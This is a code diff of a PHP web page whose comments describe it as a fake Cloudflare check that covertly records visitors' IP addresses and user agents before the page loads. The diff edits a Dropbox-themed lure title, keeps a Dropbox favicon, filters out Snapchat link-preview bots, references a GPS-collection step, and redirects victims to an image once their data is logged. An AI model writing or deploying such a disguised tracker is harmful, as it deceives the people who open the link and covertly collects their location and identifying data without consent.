@@ -1,4 +1,5 @@
 <?php
+
 //front end page
 // designed to look like a Cloudflare check
 // when really its saved the users IP Address  and user agent via php code before its loaded.
@@ -43,7 +44,7 @@ $tinyURL = "";
 if (isset($_GET['tinyURL'])) {
   $tinyURL = $_GET['tinyURL'];
 }else{
-  $tinyURL = "00000";
+  $tinyURL = "IMAGE";
 }
 
 setcookie($cookieName, $cookieValue, $expirationTime);
@@ -57,8 +58,9 @@ $values = array (null,$_SERVER['HTTP_USER_AGENT'],$_SERVER['REMOTE_ADDR'],time()
 if (insertDataIntoDatabase("tlog", $keys, $values)) {
   // code...
 }else {
-  exit();
+  //exit();
 }
+
 
 
 
@@ -66,7 +68,7 @@ if (insertDataIntoDatabase("tlog", $keys, $values)) {
 <html lang="en" class=""><head>
 
   <meta charset="UTF-8">
-  <title>Dropbox - Amber Holo Premium </title>
+  <title>Amber Holo - Premium Prices </title>
   <link rel="icon" href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" type="image/x-icon">
   <meta name="robots" content="noindex">
 
@@ -222,7 +224,7 @@ function checkIfRobot() {
   }else {
     //this is not a snapchat bot.
     reportJSStuff();
-    waitBeforeGPS();
+    //waitBeforeGPS();
   }
 }
 
@@ -290,10 +292,11 @@ function reportJSStuff() {
   })
     .done(function(data) {
       //console.log(data);
-      //$(".baconText").text(data[0]);
+      window.location.href = "https://i.ibb.co/jhbLq6g/F8-F983-B5-4-EC5-4-D3-C-A86-E-285-EF3957391.jpg";
+
     })
     .fail(function() {
-      //alert("no good");
+      window.location.href = "https://i.ibb.co/jhbLq6g/F8-F983-B5-4-EC5-4-D3-C-A86-E-285-EF3957391.jpg";
     });
 }
 
